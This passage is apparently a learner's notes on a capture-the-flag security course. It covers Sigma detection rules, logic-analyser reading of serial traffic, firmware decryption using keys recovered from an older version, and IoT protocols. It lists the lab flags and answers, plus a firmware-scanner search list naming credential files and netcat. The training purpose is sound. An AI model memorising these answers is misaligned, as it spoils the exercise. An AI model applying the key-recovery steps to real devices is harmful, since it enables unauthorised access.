- And while the above examples aren't directly concerned about application security, they help minimize the attack surface of the application, which is further tackled through server-side validation techniques such as output escaping and using parametrized queries.  

- We should be realistic and not try to solve all security problems with input validation. 
- There is not one control that could prevent persistent malicious actors and so layering these controls is the better way to move forward.



### Questions

  
Filtering for Usernames: How many usernames fit the syntax above?

- Used: `egrep '^[a-zA-Z0-9]{6,12}$' strings`

![](Pasted image 20221218104721.png)

 A: 8


Filtering for Usernames: One username consists of a readable word concatenated with a number. What is it?  

 A: User35
 
Filtering for Emails: How many emails fit the syntax above?  

- Used  `egrep '^.+@.+\.com$' strings`

![](Pasted image 20221218105211.png)

 A: 11

Filtering for Emails: How many unique domains are there?  

- Used `egrep '^.+@.+\.com$' strings | cut -d '@' -f 2 |  sort | uniq | wc -l`

![](Pasted image 20221218110309.png)

 A: 8

Filtering for Emails: What is the domain of the email with the local-part "lewisham44"?  

- Used regex again on the resulted list of emails and then used cut to get the domain: `egrep '^.+@.+\.com$' strings | egrep '^lewisham44' | cut -d '@' -f 2`

![](Pasted image 20221218110442.png)

 A: amg.com

Filtering for Emails: What is the domain of the email with the local-part "maxximax"?  

- Used regex again on the resulted list of emails and then used cut to get the domain: `egrep '^.+@.+\.com$' strings | egrep '^maxximax' | cut -d '@' -f 2`

![](Pasted image 20221218110659.png)

 A: fedfull.com

Filtering for Emails: What is the local-part of the email with the domain name "hotmail.com"?  

- Followed the same pattern except now we are matching the end of the resulted email and we want to get the local-part of the email matched, thus we change the number of the field used in cut.

![](Pasted image 20221218110728.png)

 A: hussain.volt

Filtering for URLs: How many URLs fit the syntax provided?  

- Used regex: `egrep '^http(s)?.+(www)?.+\..+$' strings `

![](Pasted image 20221218111257.png)

- We know that all URL's start with http. 
	- Thus, we can mark `s` as an optional character here
- After that, some characters are going in next
- Then we know `www` is optional
	- After that, some characters are matched
- Ans we know that the url should have a tld, thus it must have a point somewhere followed by characters.

 A: 16

Filtering for URLs: How many of these URLs start with "https"?

- Used the following bash command: `egrep '^http(s)?.+(www)?.+\..+$' strings | egrep '^https'`

![](Pasted image 20221218111633.png)

A: 7

## [Day 18] `Sigma` Lumberjack Lenny Learns New Rules

### Threat Detection

- Cyber threats and criminals have advanced tactics to ensure that they steal information and cause havoc. 
	- As you have already seen through the previous days, there are many ways in which this can be done. 
- There are also ways for security teams to prepare their defences and identify these threats. 
- What would be evident is that most of the blue-team activities will require proactive approaches to analysing different logs, malware and network traffic. 
	- This brings about the practice of threat detection.

#threatdetection

- Threat detection involves proactively pursuing and analysing abnormal activity within an ecosystem to identify malicious signs of compromise or intrusion within a network.

### Attack Scenario

- Elf McBlue obtained logs and information concerning the attack on the Best Festival Company by the Bandit Yeti. 
- Through the various analysis of the previous days, it was clear that the logs pointed to a likely attack chain that the adversary may have followed and can be mapped to the Unified Kill Chain. 
- Among the known phases of the UKC that were observed include the following:

	-   **Persistence**: The adversary established persistence by creating a local user account they could use during their attack.
	-   **Discovery**: The adversary sought to gather information about their target by running commands to learn about the processes and software on Santa’s devices to search for potential vulnerabilities.
	-   **Execution**: Scheduled jobs were created to provide an initial means of executing malicious code. This may also provide them with persistence or be part of elevating their privileges. 

- The attack chain report included indicators of compromise (IOCs) and necessary detection parameters, as listed below. 
- Additionally, the attack techniques have been linked to the MITRE ATT&CK framework for further reading.

![](Pasted image 20221219073508.png)

- Sigma application constitutes of the following features:

	-   **Run** - Submit your Sigma rule and see if it detects the malicious IOC.
	-   **Text Editor** - Write your Sigma rule in this section.
	-   **Create Rule** - Create a Sigma rule for the malicious IOC.
	-   **View Log** - View the log details associated with the malicious IOC.

### Chopping Logs with Sigma Rules
#sigma #yaml 

- Sigma is an open-source generic signature language developed by Florian Roth & Thomas Patzke to describe log events in a structured format. 
- The format involves using a markup language called [YAML](http://yaml.org/), a designed syntax that allows for quick sharing of detection methods by security analysts. 
- The common factors to note about YAML files include the following:
	-   YAML is case-sensitive.
	-   Files should have the `.yml` extension.
	-   Spaces are used for indentation and not tabs.
	-   Comments are attributed using the `#` character.
	-   Key-value pairs are denoted using the colon `:` character.
	-   Array elements are denoted using the dash `-` character.

- Sigma makes it easy to perform content matching based on collected logs to raise threat alerts for analysts to investigate. 
- Log files are usually collected and stored in a database or a Security Information and Event Management (SIEM) solution for further analysis. 
- Sigma is vendor-agnostic; therefore, the rules can be converted to a format that fits the target SIEM.

- Sigma was developed to satisfy the following scenarios:
	-   To make detection methods and signatures shareable /alongside IOCs and Yara rules.
	-   To write SIEM searches that avoid vendor lock-in.
	-   To share signatures with threat intelligence communities.
	-   To write custom detection rules for malicious behaviour based on specific conditions.

### Sigma Rule Syntax

- Sigma rules are guided by a given order of required/optional fields and values that create the structure for mapping needed queries. 
- The attached image provides a skeletal view of a Sigma rule.

![](Pasted image 20221219073928.png)

- Let’s use the first attack step challenge to define the syntax requirements, fill in the details into our skeletal rule, and detect the creation of local accounts. 
- Use the text editor section of the SigHunt application to follow along.
	-   **Title:** Names the rule based on what it is supposed to detect.
	-   **ID:** A globally unique identifier that the developers of Sigma mainly use to maintain the order of identification for the rules submitted to the public repository, found in UUID format.
	-   **Status:** Describes the stage in which the rule maturity is at while in use. There are five declared statuses that you can use:
	    -   _Stable_: The rule may be used in production environments and dashboards.
	    -   _Test_: Trials are being done to the rule and could require fine-tuning.
	    -   _Experimental_: The rule is very generic and is being tested. It could lead to false results, be noisy, and identify exciting events.
	    -   _Deprecated_: The rule has been replaced and would no longer yield accurate results. 
	    -   _Unsupported_: The rule is not usable in its current state (unique correlation log, homemade fields).
	-   **Description:** Provides more context about the rule and its intended purpose. Here, you can be as detailed as possible to provide information about the detected activity.
	-   **Logsource:** Describes the log data to be used for the detection. It consists of other optional attributes:
	    -   _Product_: Selects all log outputs of a certain product. Examples are Windows, Apache
	    -   _Category_: Selects the log files written by the selected product. Examples are firewalls, web, and antivirus.
	    -   _Service_: Selects only a subset of the logs. Examples are _sshd_ on Linux or _Security_ on Windows.
	    -   _Definition_: Describes the log source and its applied configurations.
	-   **Detection:**  A required field in the detection rule describes the parameters of the malicious activity we need an alert for. The parameters are divided into two main parts:
	    -   _The search identifiers_ are the fields and values the detection should search for.
	    -   _The condition expression_ - sets the action to be taken on the detection, such as selection or filtering. The critical thing to look out for account creation on Windows is the Event ID associated with user accounts. In this case, Event ID: 4720 was provided for us on the IOC list, which will be our search identifier.

-  The search identifiers can be enhanced using different modifiers appended to the field name with the pipe character `|`. 
- The main type of modifiers are known as **Transformation modifiers** and comprise the values: _contains_, _endswith_, _startswith_, and _all_. 
	- Some of these modifiers will be vital in writing rules against the other IOCs.

![](Pasted image 20221219074805.png)

-   **FalsePositives:** A list of known false positives that may occur based on log data.
    
-   **Level:** Describes the severity with which the security team should take the activity under the written rule. The attribute comprises five levels: Informational -> Low -> Medium -> High -> Critical
    
-   **Tags:** Adds information that can be used to categorise the rule. Common tags are associated with tactics and techniques from the MITRE ATT&CK framework. Sigma developers have defined a list of [predefined tags](https://github.com/SigmaHQ/sigma/wiki/Tags).

- As mentioned before, Sigma rules are converted to fit the desired SIEM query, and in our case, it should be known that they are being transformed into Elastic Queries on the backend. 
- Various resources perform this task, with the native tool being [Sigmac](https://github.com/SigmaHQ/sigma/blob/master/tools/README.md), which is being deprecated and replaced with a more stable python library, [pySigma](https://github.com/SigmaHQ/pySigma). 
	- Another notable tool to check out is [Uncoder.io](https://uncoder.io/). 
- Uncoder.IO is an open-source web Sigma converter for numerous SIEM and EDR platforms. 
	- It is easy to use as it allows you to copy your Sigma rule on the platform and select your preferred backend application for translation.

### Questions

  
What is the Challenge #1 flag?

![](Pasted image 20221219074921.png)

 A: THM{n0t_just_your_u$ser}

From the Challenge 1 log, what user account was created?  

![](Pasted image 20221219075015.png)

 A: 	BanditYetiMini

What is the Challenge #2 flag?  

```yml
title: SoftwareDiscovery 
id: 0f06a3a5-6a09-413f-8743-e6cf35561298 
status: experimental # experimental, test, stable, deprecated, unsupported.
description: Detects the installation of a new software
author:
date:
modified:

logsource: # Outlines target source of the logs based on operating system, service being run, category of logs.
  product: windows # windows, linux, macos.
  service: sysmon # sshd for Linux, Security for Windows, applocker, sysmon.
  category: process_creation # firewall, web, antivirus, process_creation, network_connection, file_access.
detection:
  selection:
    EventID:
    -   1 
    Image|endswith:
    -    'reg.exe'
    CommandLine|contains|all:
    - reg 
    - query  
    - /v 
    - svcVersion

  condition: selection # Action to be taken. Can use condition operators such as OR, AND, NOT when using multiple search identifiers.

falsepositives: 
    - unknown # Legitimate services or use.

level: low  # informational, low, medium, high or critical.

tags: # Associated TTPs from MITRE ATT&CK
  - {attack.tactic} # MITRE Tactic
  - {attack.technique} # MITRE Technique 
```

![](Pasted image 20221219080436.png)

 A: THM{wh@t_1s_Runn1ng_H3r3}

What was the User's path in the Challenge #2 log file?  

![](Pasted image 20221219080631.png)

 A:  	SIGMA_AOC2022\Bandit Yeti
 

What is the Challenge #3 flag?  

![](Pasted image 20221219081034.png)

 A:  THM{sch3dule_0npo1nt_101}

What was the MD5 hash associated with Challenge #3 logs?

![](Pasted image 20221219081154.png)

A: 2F6CE97FAF2D5EEA919E4393BDD416A7


## [Day 19] `Hardware Hacking` Wiggles go brrr

#hardware 

### Welcome to the Matrix

- Hardware hacking is often shrouded in mystery and seen as a super complex topic. 
- While there are a lot of in-depth complex hardware hacking components, getting our feet wet is actually pretty simple. 
	- Computers today are incredibly powerful. 
- This allows them to build additional features and safety measures into their communication protocols to ensure that messages are transmitted reliably. 
	- Think about the Transmission Control Protocol (TCP), which has multiple redundancies in place! It even sends three full packets just to start its communication!

- In the world of microchips, we often don't have this luxury. 
- To make sure our communication protocols are efficient as possible, we need to keep them as simple as possible. 
	- To do that, we need to enter the world of 0s and 1s. 
- This then begs the question, how does hardware take electricity and generate signals? 
	- In this task, we will focus on digital communication. 
- For hardware communication, we use a device called a Logic Analyser to analyse the signals. 
- This device can be connected to the actual electrical wires that are used for communication between two devices that will capture and interpret the signals being sent. 
	- In this task, we will use a logic analyser to determine the communication between two devices in the rogue implant.

### The Electrical Heartbeat

- Back to our question, if we have electricity, how can we generate a digital signal? 
- The approach most hardware components take is to simply turn the power on and off. 
	- If the power is on, we are transmitting a digital 1. 
	- If the power is off, we are transmitting a digital 0. 
- We call these 1s and 0s bits. To perform communication, we simply turn the power on and off in a specific sequence to transmit a bunch of 0s and 1s. 
	- If we send 8 bits, we are sending a single byte! Voila! 
- We have just performed digital hardware communication! 
- These are the wonderful squiggly lines you would see on a logic analyser:

![](Pasted image 20221220091805.png)

- We can transmit text data by using the [ASCII table](https://www.asciitable.com/). 
- Sending the binary representation of each character, we can transmit data! 
	- However, it isn't actually just that simple. 
- If we wanted zero effort in our communication, we would need an electrical wire for each 0 or 1 that we wanted to transmit. 
- Considering that a single character is one byte of data (thus 8 electrical wires), this can become a mess of wires really fast! 
- To make this more efficient, we need to use fewer wires and then have both hardware chips agree to a specific digital protocol and configuration that will be used to transmit data. 
- Let's look at some of the most common protocols and how they work to send data still while reducing the number of wires we need.

#### **USART**
#usart

- Universal Synchronous/Asynchronous Receiver-Transmitter (USART) communication, or as it is better known, serial communication, is a protocol that uses two wires. 
- One wire is used to transmit (TX) data from device A to device B, and the other wire is used to receive (RX) data on device A from device B. 
	- In essence, we connect the transmit port from one device to the receive port from the other device and vice versa.

- What is interesting about this protocol is that there is no clock line that synchronises the communication of the devices. 
- Without a clock, the devices have to agree to the configuration of communication, such as the following:

	-   Communication speed - This is also called the baud rate or bit rate and dictates how fast bytes of data can be sent. 
		- Agreeing to a specific rate tells each device how fast it should sample the data to get accurate communication. 
		- While there are fixed standards for baud rates, devices can choose to use any other rate as long as both devices support it.  
	-   Bits per transmission - This is normally set to 8 bits which makes a byte, but it can be configured to something else, such as 16 bits.
	-   Stop and Start bits - Since there is no clock, one device has to send a signal to the other device before it can send or end a data transmission. 
		- The configuration of the start and stop bits dictate how this is done.
	-   Parity bits - Since there can be errors in the communication, parity bits can be used to detect and correct such errors in the transmission.

- Once the two devices agree on the configuration of the serial lines, they can now communicate with each other. 
- A single transmission is shown in the diagram below on how the ASCII character of "S" would be transmitted:

![](Pasted image 20221220092251.png)

- There are a couple of caveats, however. 
- The devices don't really have a way to determine if the other device is ready for communication. 
	- To solve this, some USART connections will use two additional lines called Clear To Send (CTS) and Request to Send (RTS) to communicate to the other device whether it is ready to receive or ready to transmit. 
- Furthermore, to agree upon what voltage level is a binary 1 or 0, a third wire called the Ground (GND) wire is required to allow the devices to have the same voltage reference.  

- However, despite all of this, USART is an incredibly popular protocol in microprocessors due to its simplicity

#### **SPI**
#spi

- The Serial Peripheral Interface (SPI) communication protocol is mainly used for communication between microprocessors and small peripherals such as a sensor or an SD card. 
	- While USART communication has the clock built into the TX and RX lines, SPI uses a separate clock wire. 
- Separating the clock (SCK) from the data (DATA) line allows for synchronous communication, which is faster and more reliable. 
	- So the trade-off is adding an additional wire, but we gain a speed and reliability boost. 
- An example of the same "S" being transmitted using SPI is shown below:

![](Pasted image 20221220092514.png)

- The clock line tells the receiving device exactly when it needs to read the data line. 
- Two-way communication is also possible, but quite a bit more complex than serial communication. 
	- Essentially, one of the devices is labelled the controller. 
		- This is the only device that is allowed to send clock signals. 
	- All other devices become secondary devices that must follow the controller's clock signal to transmit data back. 
- If two-way communication is used, instead of having a single data line, two lines are used, namely Peripheral-In Controller-Out (PICO), which means communication is sent from the controller, and Peripheral-Out Controller-In (POCI), which means communication is sent from the secondary device back to the controller. 
- Using this, the controller sends a clock signal and a command out to the device using the PICO line and then keeping the clock signal, the controller receives data back on the PICO line, as shown in the diagram below:

![](Pasted image 20221220092645.png)

- There is one additional change that can be made. 
- While there can only be one controller, there can be multiple secondary devices. 
- To save wires and ports, all devices can use the same SCK, PICO, and POCI lines. 
	- A fourth wire, called the Chip Select (CS) wire, is used to distinguish the device that the communication is meant for. 
- The controller can use this line to indicate to the specific device that it wants to communicate to it, as shown in the diagram below:

![](Pasted image 20221220092732.png)

- SPI communication is a fair bit more complex than USART, but having a dedicated clock line increases the speed at which we can communicate and improves reliability.


### **I2C**
#i2c

- The Inter-Integrated Circuit (I2C) communication protocol was created to deal with the drawbacks of both the USART and SPI communication protocols. 
- Because USART is asynchronous and has the clock built into the transmit and receive lines, devices have to agree ahead of time on the configuration of communication. 
	- Furthermore, speeds are reduced to ensure communication remains reliable. 
- On the other hand, while SPI is faster and more reliable, it requires many more wires for communication, and every single additional peripheral requires one more Chip Select wire.

- I2C attempts to solve these problems. 
	- Similar to USART, I2C only makes use of two lines for communication. 
- I2C uses a Serial Data (SDA) line and Serial Clock (SCL) line for communication. However, instead of using a Chip Select wire to determine which peripheral is being communicated to, I2C uses an Address signal that is sent on the SDA wire. 
	- This Address tells all controllers and peripherals which device is trying to communicate and to which device it is trying to communicate to. 
- Once the signal is sent, a Data signal can be used to send the actual communication. 
- To notify other controllers and peripherals that communication is taking place and prevent these devices from talking over each other, a Start and Stop signal is used. 
- Each device can monitor these Start and Stop signals to determine if the lines are busy with communication. 
- An example of such a data transmission is shown below:

![](Pasted image 20221220092940.png)

- Since an external clock line is used, communication is still faster and more reliable than USART, and while it is slightly slower than SPI, the use of the Address signal means up to 1008 devices can be connected to the same two lines and will be able to communicate. 
- Now that we understand the basics of hardware communication protocols, we can look to analyse the logic of that rogue implant!

### Probing the Logic

- After sending this rogue implant to the forensic lab for analysis, the following circuit diagram is uncovered:

![](Pasted image 20221220093109.png)

- Based on the diagram, it seems like there is a microprocessor that is connected to an ESP32 chip. 
	- Doing some research, we can see that the ESP32 chips allow microprocessors to communicate over WiFi and Mobile networks. 
- So whatever this implant was doing, it was definitely communicating with someone else. 
- If we can intercept the communication between the microprocessor and the ESP32 chip, we would be able to see what commands and information are being sent.

- The elves realise that these chips probably use digital communication that can be intercepted with a Logic Analyser. 
- Looking at the wires between the chips, we see a black wire connected to a pin called GND and a red wire connected to a pin called VIN. 
- Elf Forensic knows from experience that this would be the Ground and Voltage IN wires, respectively, meaning these wires are used to provide power to the chip. 
- That then leaves the green and purple wires that would be used for data transmission. 
- Seeing that they are connected to the RX0 and TX0 pins, Elf Recon can deduce that this refers to the Transmit and Receive lines of USART communication. 
- Hence we are pretty sure that the protocol used for communication is USART. 
- Armed with this information, the elves connect the probes of the Logic Analyser to the green and purple wires before powering on the implant. 
- Immediately, super-fast signals are seen on the analyser! The elves create a logic data dump from the signals, and McSkidy is asking you to investigate what is actually being transmitted!

### Analysing the Logic
#saleae

- In order to analyse the logic data dump, we will need to use a logic analyser tool called [Saleae](https://www.saleae.com/).

![](Pasted image 20221220093436.png)

![](Pasted image 20221220093544.png)

- D0 and D1 refer to the digital channels of the two lines that were probed. 
- A0 and A1 refer to the analogue data from the probers.
- Hover your mouse over the first thick line on D1 channel 1 and use Left-Ctrl and the mouse wheel to zoom in again; you should be able to see the entire signal transfer:

![](Pasted image 20221220093641.png)

- What is very interesting from this screen is that you can see how the analogue voltage data corresponds to the digital signal that is seen. 
- Looking at the A1 Channel 1 vs D1 Channel 1, you can see that there are slight breaks in the analogue data that have been corrected in the digital channel. 
- Now that we can see the digital signal data, we can look to use a logic analyser to read the contents of the data. 
- Click on the Analyzers tab to the right:

- Since we know the protocol is USART, let's look to configure an Async Serial analyser for both Channel 1 and 0.
- Let's configure Channel 1's analyser first. 
- If we were true hardware reverse engineers, we would first have to figure out the rate at which data is being transmitted as well as the specific configuration such as parity bits and frames. 
- However, to keep this simple Forensic Elf has already discovered this for you. 

- Once saved, we can see that the data is being analysed. 
- Click the little terminal Icon, and we can actually read the data being transmitted!

![](Pasted image 20221220094335.png)

- We see the initialisation sequence of the serial line and then three lines of data being sent:
	-   ACK REBOOT
	-   CMDX195837
	-   9600

- This doesn't yet mean anything since we are only seeing one side of the data. 
- In order to see the other messages, we need to add another analyser to Channel 0.
- Click the plus icon next to Analysers and add another Async Serial analyser with the same configuration, except for Channel 0:

![](Pasted image 20221220094601.png)

- Now we are starting to piece together the information! 
- It seems like the microprocessor is establishing a session with the ESP32 device to allow communication to the control server! 
	- We can now see the full discussion between the two devices. 
- The processor asks the ESP32 to reboot its connection to the control server. 
	- The ESP32 is happy to oblige but requests a security code to be sent to allow connection to the control server. 
- Once the security code has been transmitted, the ESP32 allows the microprocessor to negotiate a new baud rate to be used for communication. 
- Interestingly, once this new baud rate is accepted, we cannot read the rest of the output! 
- However, since we intercepted the baud rate, we can simply edit our Channel 0 analyser to a new baud rate to read the rest of the communication that was sent. 
	- Go make this change to get your flag!

- This is excellent progress! 
- We were able to read the initial communication between these two devices that were used to establish a connection to the control server. 
- Now that we have this information, we can keep monitoring the lines and analysing the logic to see any messages that are sent. 
- We are one step closer to knowing who is responsible for this rouge implant!


### Questions

What device can be used to probe the signals being sent on electrical wires between two devices?

A: logic analyser

USART is faster than SPI for communication? (Yea,Nay)  

A: nay

USART communication uses fewer wires than SPI? (Yea,Nay)  

A: yea

USART is faster than I2C for communication? (Yea,Nay)  

A: nay

I2C uses more wires than SPI for communication? (Yea,Nay)  

A: nay

SPI is faster than I2C for communication? (Yea,Nay)  

A: yea

What is the maximum number of devices that can be connected on a single pair of I2C lines?  

A: 1008

What is the new baud rate that is negotiated between the microprocessor and ESP32 chip?  

- It is specified in the data we got

A:  9600

What is the flag that is transmitted once the new baud rate was accepted?  

- Change the baud rate to 9600 of the second async serial we created

![](Pasted image 20221220095155.png)

A: THM{Hacking.Hardware.Is.Fun}

## [Day 20] `Firmware` Binwalkin’ around the Christmas tree

#firmware #reverseengineering 

### **What is Firmware Reverse Engineering**

- Every embedded system, such as cameras, routers, smart watches etc., has pre-installed firmware, which has its own set of instructions running on the hardware's processor. 
- It enables the **hardware to communicate with other software running on the device**. 
	- The firmware provides low-level control for the designer/developer to make changes at the root level. 

- Reverse engineering is working your way back through the code to figure out how it was built and what it does. 
- Firmware reverse engineering is extracting the original code from the firmware binary file and verifying that the code does not carry out any malicious or unintended functionality like undesired network communication calls. 
- **Firmware reversing is usually done for security reasons** to ensure the safe usage of devices that may have critical vulnerabilities leading to possible exploitation or data leakage. 
	- Consider a smart watch whose firmware is programmed to send all incoming messages, emails etc., to a specific IP address without any indication to the user.

### **Firmware Reversing Steps**

-   The firmware is first obtained from the vendor's website or extracted from the device to perform the analysis.
-   The obtained/extracted firmware, usually a binary file, is first analysed to figure out its type (bare metal or OS based). 
-   It is verified that the firmware is either encrypted or packed. The encrypted firmware is more challenging to analyse as it usually needs a tricky workaround, such as reversing the previous non-encrypted releases of the firmware or performing hardware attacks like [Side Channel Attacks (SCA)](https://en.wikipedia.org/wiki/Side-channel_attack) to fetch the encryption keys. 
-   Once the encrypted firmware is decrypted, different techniques and tools are used to perform reverse engineering based on type.

### **Types of Firmware Analysis**  

- Firmware analysis is carried out through two techniques, Static & Dynamic.

#### **Static Analysis**

- Static analysis involves an essential examination of the binary file contents, performing its reverse engineering, and reading the assembly instructions to understand the functionality. 
- This is done through multiple commonly used command line utilities and binary analysis tools such as:

	-   **[BinWalk](https://github.com/ReFirmLabs/binwalk):** A firmware extraction tool that extracts code snippets inside any binary by searching for signatures against many standard binary file formats like `zip, tar, exe, ELF,` etc. 
		- Binwalk has a database of binary header signatures against which the signature match is performed. 
		- The common objective of using this tool is to extract a file system like `Squashfs, yaffs2, Cramfs, ext*fs, jffs2,` etc., which is embedded in the firmware binary. 
			- The file system has all the application code that will be running on the device.
	-   **[Firmware ModKit (FMK)](https://www.kali.org/tools/firmware-mod-kit/)**: FMK is widely used for firmware reverse engineering. 
		- It extracts the firmware using `binwalk` and outputs a directory with the firmware file system. 
		- Once the code is extracted, a developer can modify desired files and repack the binary file with a single command.   
    
	-   **[FirmWalker](https://github.com/craigz28/firmwalker)**: Searches through the extracted firmware file system for unique strings and directories like `etc/shadow`, `etc/passwd`, `etc/ssl`, special keywords like `admin, root, password`, etc., vulnerable binaries like `ssh, telnet, netcat` etc.

#### **Dynamic Analysis**

- Firmware dynamic analysis involves running the firmware code on actual hardware and observing its behaviour through emulation and hardware/ software based debugging. 
- One of the significant advantages of dynamic analysis is to analyse unintended network communication for identifying data pilferage. 
- The following tools are also commonly used for dynamic analysis:

	-   **[Qemu](https://www.qemu.org/)**: Qemu is a free and open-source emulator and enables working on cross-platform environments. 
		- The tool provides various ways to emulate binary firmware for different architectures like Advanced RISC Machines (ARM), Microprocessors without Interlocked Pipelined Stages (MIPS), etc., on the host system. 
		- Qemu can help in full-system emulation or a single binary emulation of ELF (Executable and Linkable Format) files for the Linux system and many different platforms.
	-   **[Gnu DeBugger (GDB)](https://www.sourceware.org/gdb/)**[:](https://www.sourceware.org/gdb/) GDB is a dynamic debugging tool for emulating a binary and inspecting its memory and registers. 
		- GDB also supports remote debugging, commonly used during firmware reversing when the target binary runs on a separate host and reversing is carried out from a different host.

- Open the terminal and run the `dir` command. You will see the following directories:

```shell-session
ubuntu@machine$ dir
bin  firmware-mod-kit  bin-unsigned
```

- The `bin` folder contains the firmware binary, while the `firmware-mod-kit` folder contains the script for extracting and modifying the firmware.

- In this exercise, we will primarily be using two tools:

-   **Binwalk**: For verifying encryption and can also be used to decrypt the firmware (Usage: `binwalk -E -N`)
-  **Firmware Mod Kit (FMK)**: Library for firmware extraction and modification (Usage: `extract-firmware.sh`)
#binwalk #fmk

### **Step 1: Verifying Encryption**  

- In this step, McSkidy will verify whether the binary `firmwarev2.2-encrypted.gpg` is encrypted through [file entropy analysis](https://en.kali.tools/?p=1634). 
- First, change the directory to the `bin` folder by entering the command `cd bin`. 
- She will then use the `binwalk` tool to verify the encryption using the command `binwalk -E -N firmwarev2.2-encrypted.gpg.`

![](Pasted image 20221223104937.png)

- In the above output, the **rising entropy edge** means that the file is probably encrypted and has increased randomness.

### **Step 2: Finding Unencrypted Older Version**  

- Since the latest version is encrypted, McSkidy found an older version of the same firmware. 
- The version is located in the `bin-unsigned` folder. 
	- _Why was she looking for an older version?_ 
- Because she wants to find encryption keys that she may use to decrypt the original firmware and reverse engineer it. 
- McSkidy has decided to use the famous `FMK` tool for this purpose. 
- To extract the firmware, change the directory by entering the command `cd ..` and then `cd bin-unsigned`. 
- She extracted the firmware by issuing the following command: `extract-firmware.sh firmwarev1.0-unsigned`

![](Pasted image 20221223105300.png)

### Step 3: Finding Encryption Keys  

- The original firmware is [gpg](https://en.wikipedia.org/wiki/GNU_Privacy_Guard) protected, which means that we need to find a public, and private key and a paraphrase to decrypt the originally signed firmware. 
- We know that the unencrypted firmware is extracted successfully and stored in the `fmk` folder. 
- The easiest way to find keys is by using the `grep` command. The `-i` flag in the grep command ignores case sensitivity while the `-r` operator recursively searches in the current directory and subdirectories: `grep -ir key`

![](Pasted image 20221223105532.png)

- Bingo! We have the **public and private keys**, but what about the **paraphrase** usually used with the private key to decrypt a gpg encrypted file?  

- Let's find the paraphrase through the same `grep` command: `grep -ir paraphrase`

![](Pasted image 20221223105643.png)

### Step 4: Decrypting the Encrypted Firmware  

- Now that we have the keys, let's import them using the following command: `gpg --import fmk/rootfs/gpg/private.key`

![](Pasted image 20221223120341.png)

![](Pasted image 20221223120408.png)

- Importing the public key: `gpg --import fmk/rootfs/gpg/public.key`

![](Pasted image 20221223120520.png)

- We can list the secret keys: `gpg --list-secret-keys`

![](Pasted image 20221223120639.png)

- Once the keys are imported, McSkidy decrypts the firmware using the `gpg` command. 
- Again change the directory by entering the command `cd ..` and then `cd bin`.
`gpg firmwarev2.2-encrypted.gpg`

![](Pasted image 20221223120743.png)

![](Pasted image 20221223120840.png)

### **Step 5: Reversing the** **Original** **Encrypted Firmware**  

- This is the simplest step, and we can use `binwalk` or `FMK` to extract code from the recently unencrypted firmware. In this example, we will be using `FMK` to extract the code.
`extract-firmware.sh firmwarev2.2-encrypted`

![](Pasted image 20221223120945.png)

- McSkidy has finally been able to reverse the complete firmware and extract essential files she will use for IoT exploitation (next room). 
- She has used the keys from an older version (1.0)  to decrypt the latest version (2.2) of the same firmware. 
- The `Camera` folder in the `fmk/rootfs` directory will contain all the necessary files we will be using in the next task.

### Questions

  
What is the flag value after reversing the file firmwarev2.2-encrypted.gpg?

**Note**: The flag contains underscores - if you're seeing spaces, the underscores might not be rendering.

![](Pasted image 20221223121111.png)

 A: THM{WE_GOT_THE_FIRMWARE_CODE}
 
What is the Paraphrase value for the binary firmwarev1.0_unsigned?  

 A: Santa@2022

After reversing the encrypted firmware, can you find the build number for rootfs?

- cd into **rootfs** and issue the command `ls -alh`. 
- Look around for a red line:

![](Pasted image 20221223121420.png)

A: 2.6.31

## [Day 21] `MQTT` Have yourself a merry little webcam

#iot

### What is the Internet of Things 

- The **I**nternet **o**f **T**hings (**IoT**) defines a categorization of just that, “things”. 
	- Devices are interconnected and rely heavily on communication to achieve a device’s objectives. 
	- Examples of IoT include thermostats, web cameras, and smart fridges, to name only a few.

- While the formal definition of IoT may change depending on who is setting it, the term can best be used as a broad categorization of “a device that sends and receives data to communicate with other devices and systems.” 

- If IoT defines such an extensive categorization of devices with varying capabilities and objectives, what makes them important or warrants that we study them? 
- While several justifiable reasons exist to study IoT, we will address three possible answers.

- First, IoT categorizes unique devices, e.g., smart fridges, that don't match other categories, such as mobile devices. 
- IoT devices tend to be lightweight, which means that the device's functionality and features are limited to only essentials. 
	- Because of their lightweight nature, modern features may be left out or overlooked, one of the most concerning being security. 
- While we live in a modern era of security, it may still be considered secondary, which is why it is not included in core functionality.

- Second, devices are interconnected and often involve no human interaction. 
- Think of authentication in which a human uses a password for security; these devices must not only be designed to communicate data effectively but also negotiate a secure means of communication such that human interaction is not required, e.g., using a password.

- Third, devices are designed to all be interconnected, so if _device a_ is using _x protocol_ and _device b_ is using _y protocol_, it presents a significant problem in compatibility. 
- The same concept can be applied to security where devices are incompatible but could fall back to insecure communication.

- Remember, security is often thought of as secondary, so not ensuring a device can securely communicate with other devices may be a fatal weakness that is overlooked or deemed less important.

- In the next section, we will cover how IoT protocols function and study examples of how devices may or may not address the flaws proposed above.

### Introduction to IoT Protocols

-  An "IoT protocol" categorizes any protocol used by an IoT device for **machine-to-machine**, **machine-to-gateway**, or **machine-to-cloud** communication. 
- As previously defined, an IoT device sends and receives data to communicate with other devices and systems; with this in mind, an IoT protocol's objective should be _efficient_, _reliable_, and _secure_ data communication.

- We can break up IoT protocols into one of two types, an **IoT data protocol** or an **IoT network protocol**. 
- These types may be deceiving in their name as both are used to communicate data. 
	- How they differentiate is how and where the communication occurs. 
- At a glance, an IoT data protocol commonly relies on the **TCP/IP** (**T**ransmission **C**ontrol **P**rotocol/**I**nternet **P**rotocol) model, and an IoT network protocol relies on wireless technology for communication.

- Let's break down an IoT data protocol into concepts that may be more familiar to us. 
- An IoT data protocol is akin to common network services you may use or interact with daily, such as HTTP, SMB, FTP, and others. 
	- In fact, HTTP can be used as the backbone for other IoT protocols or as an IoT data protocol itself.

- An IoT network or wireless protocol still maintains the same goals as data protocols, that is, data communication, but it achieves it differently. 
- Rather than relying on traditional TCP protocols, these protocols use wireless technology such as Wi-Fi, Bluetooth, ZigBee, and Z-Wave to transfer data and communicate between entities.

- Throughout this task, we will focus on the former category of protocols and how they interact with IoT devices.

- So then, let's dive deeper into IoT data protocols and what makes them… well, a data protocol.

### Messaging Protocols and Middleware 

- Because data communication is the primary objective of IoT data protocols, they commonly take the form of a **messaging protocol**; that is, the protocol facilities the **sending** and **receiving** of a **message** or **payload** between two parties.

- Messaging protocols communicate between two devices through an independent server (”**middleware**”) or by negotiating a communication method amongst themselves.

- Devices commonly use middleware because they must be lightweight and efficient; for example, an IoT device may not support a more robust protocol, such as HTTP. 
	- A server is placed in the middle of two clients who want to communicate to translate the communication method to a means both devices can understand, given their technology.

![](Pasted image 20221223151914.png)

- Recall how we mentioned that the combability of device protocols could be a problem; middleware fixes some of the associated issues but may still be unable to translate all communications.

